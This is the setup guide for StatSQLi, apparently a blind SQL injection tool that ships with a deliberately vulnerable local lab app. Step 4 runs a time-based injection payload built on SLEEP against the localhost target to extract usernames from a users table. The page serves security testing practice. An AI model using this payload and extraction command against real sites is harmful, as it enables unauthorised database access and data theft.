# Getting Started

## Prerequisites

- Python 3.8+
- `pip`
- A local terminal environment

## 1) Clone and install project dependencies

```bash
git clone https://github.com/dcbhupendra7/BlindSQLInjection
cd BlindSQLInjection
pip install -r requirements.txt
pip install -e .
```

## 2) Install documentation dependencies

```bash
pip install mkdocs mkdocs-material pymdown-extensions
```

Optional: save docs dependencies in a dedicated file:

```bash
pip freeze | rg "mkdocs|pymdown" > docs-requirements.txt
```

## 3) Run the vulnerable lab target

```bash
cd lab
python app.py
```

Expected startup output includes a localhost server on `http://127.0.0.1:5000`.

## 4) Run StatSQLi from another terminal

```bash
statsqli "http://127.0.0.1:5000/vulnerable?id=1" \
  --payload "' OR ({condition}) AND SLEEP(2) -- -" \
  --table users \
  --column username \
  --where "1=1 LIMIT 0,1"
```

## 5) Serve documentation locally

From repository root:

```bash
mkdocs serve
```

Then open `http://127.0.0.1:8000`.

## 6) Build static documentation

```bash
mkdocs build --clean
```

The generated site is written to the `site/` directory and is ready for static hosting.
